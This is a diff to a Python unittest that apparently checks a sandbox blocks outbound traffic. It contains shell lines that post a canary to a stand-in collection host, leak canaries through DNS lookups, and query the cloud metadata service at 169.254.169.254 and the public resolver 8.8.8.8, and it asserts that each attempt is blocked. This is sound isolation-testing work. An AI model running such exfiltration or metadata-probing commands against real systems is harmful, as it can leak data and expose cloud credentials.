@@ -234,6 +234,8 @@ class RealEgress(unittest.TestCase):
 wget -q -T 4 -O- --post-data canary=CANARY-0001 http://203.0.113.7/collect >/dev/null 2>&1; echo POSTED
 (nslookup leak-CANARY-0002.example.net >/dev/null 2>&1 && echo DNS-OPEN || echo DNS-BLOCKED)
 (wget -q -T 4 -O- http://host.microsandbox.internal:{api.port}/ >/dev/null 2>&1 && echo HOST-OPEN || echo HOST-BLOCKED)
+(wget -q -T 4 -O- http://169.254.169.254/v1.json >/dev/null 2>&1 && echo META-OPEN || echo META-BLOCKED)
+(nslookup direct-CANARY-0003.example.net 8.8.8.8 >/dev/null 2>&1 && echo DNS8888-OPEN || echo DNS8888-BLOCKED)
 """
         try:
             with Sinkhole() as sink:
@@ -243,7 +245,10 @@ wget -q -T 4 -O- --post-data canary=CANARY-0001 http://203.0.113.7/collect >/dev
         finally:
             api.close()
         out = res.stdout.split()
-        for word in ("DIRECT-BLOCKED", "IP-BLOCKED", "POSTED", "DNS-BLOCKED", "HOST-BLOCKED"):
+        # META: the cloud metadata service (Vultr's answers the VX1 host itself with HTTP 200).
+        # DNS8888: a query sent straight to a public resolver is dropped, not even counted.
+        for word in ("DIRECT-BLOCKED", "IP-BLOCKED", "POSTED", "DNS-BLOCKED", "HOST-BLOCKED", "META-BLOCKED",
+                     "DNS8888-BLOCKED"):
             self.assertIn(word, out, res.stdout + res.stderr)
         self.assertEqual(canaries, ["CANARY-0001", "CANARY-0002"])
         self.assertEqual([e["dest"] for e in events if e["kind"] == "tcp"], ["203.0.113.7:80"])
